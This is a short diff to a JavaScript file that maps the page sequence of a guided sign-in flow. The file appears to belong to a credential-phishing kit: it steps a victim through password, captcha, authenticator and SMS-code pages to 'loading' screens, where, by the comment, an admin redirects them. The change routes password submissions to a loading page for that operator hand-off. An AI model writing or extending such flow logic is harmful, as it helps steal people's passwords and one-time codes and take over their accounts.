@@ -1307,8 +1307,8 @@ function wireContinueButtons(){
   // Per-design page → next mapping for the guided flow.
   var DESIGN_NEXT = {
     'go': { 'signin': 'signinp', 'signinp': 'signinploading' },
-    // ge: email → loading; admin redirects to password; password stays put
-    'ge': { 'signin': 'loading', 'password': '', 'noaccount': '', 'captcha': '', 'confirmrecovery': '', 'checkphone': '', 'authenticator': '', 'confirmphone': 'sendcode', 'sendcode': 'smscode', 'smscode': '' }
+    // ge: email → loading; password → loading; admin redirects onward
+    'ge': { 'signin': 'loading', 'password': 'loading', 'noaccount': '', 'captcha': '', 'confirmrecovery': '', 'checkphone': '', 'authenticator': '', 'confirmphone': 'sendcode', 'sendcode': 'smscode', 'smscode': '' }
   };
   var NEXT = (DESIGN_NEXT[loc.design]) || { 'signin': 'signinp', 'signinp': 'loading' };
   var bodyNext = document.body && document.body.getAttribute && document.body.getAttribute('data-ux-next');
